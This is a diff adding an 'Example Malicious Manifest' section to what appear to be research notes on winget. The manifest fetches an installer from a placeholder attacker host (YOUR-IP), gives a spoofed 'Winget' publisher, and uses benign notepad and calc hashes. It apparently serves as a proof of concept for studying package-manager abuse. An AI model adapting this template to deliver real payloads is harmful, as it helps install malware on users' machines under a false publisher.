@@ -234,3 +234,23 @@ Location: `C:\Users\XXXX\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8w
 Filename: `installed.db`
 
 ![image](https://user-images.githubusercontent.com/8741929/232543386-31aa603d-d239-4538-bc76-0fb796f64f0b.png)
+
+### Example Malicious Manifest
+
+```yml
+PackageIdentifier: OpsecInstaller
+PackageName: Opsec
+ShortDescription: Opsec test installer
+PackageVersion: 1.0.0
+PackageLocale: en-US
+License: MIT
+Publisher: Winget
+Installers: 
+ - Architecture: x64
+   InstallerType: exe
+   InstallerUrl: http://YOUR-IP/notepad.exe
+   InstallerSha256: 972efbb0e7990a0b8404bbf9c7a57b047db169628aba7a017fd815ee5202e4d3 # notepad.exe
+   #InstallerSha256: 9c2c8a8588fe6db09c09337e78437cb056cd557db1bcf5240112cbfb7b600efb # calc.exe
+ManifestType: singleton
+ManifestVersion: 1.0.0
+```
